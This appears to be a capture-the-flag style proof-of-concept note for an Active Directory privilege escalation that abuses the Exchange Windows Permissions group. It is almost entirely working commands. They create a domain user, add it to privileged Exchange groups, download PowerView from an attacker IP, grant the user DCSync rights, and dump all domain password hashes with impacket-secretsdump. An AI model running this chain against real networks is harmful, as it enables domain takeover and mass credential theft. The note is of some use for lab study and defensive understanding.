
An severe misconfiguration which grants us the power to grant ourselves any permission on the domain.

## PoC

1. Creating user and putting him into the Group we want to elevate our privileges.

```
net user hacker password /add /domain  
net group “Exchange Windows Permissions” hacker /add
```

2. Adding user to the "Exchange Trusted Subsystem" Group. 

```
PS C:\\Users\\svc-alfresco\\appdata> Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members svc-alfresco
```

3. Re-login into user for the group membership to take effect. 

4. Load PowerView and set up [[DCSync]] rights.

```
iwr -iri http://10.10.4.23/PowerView.ps1 -OutFile PowerView.ps1
Import-Module .\PowerView.ps1
```

5. Setting up DCSync rights.

```
Add-DomainObjectAcl -TargetIdentity “DC=htb,DC=local” -PrincipalIdentity hacker -Rights DCSync
```

Since our created user "hacker" got DSync permissions now, we can dump all the hashes of users of the domain remotely.

```
impacket-secretsdump htb.local/hacker:password@10.129.59.98
```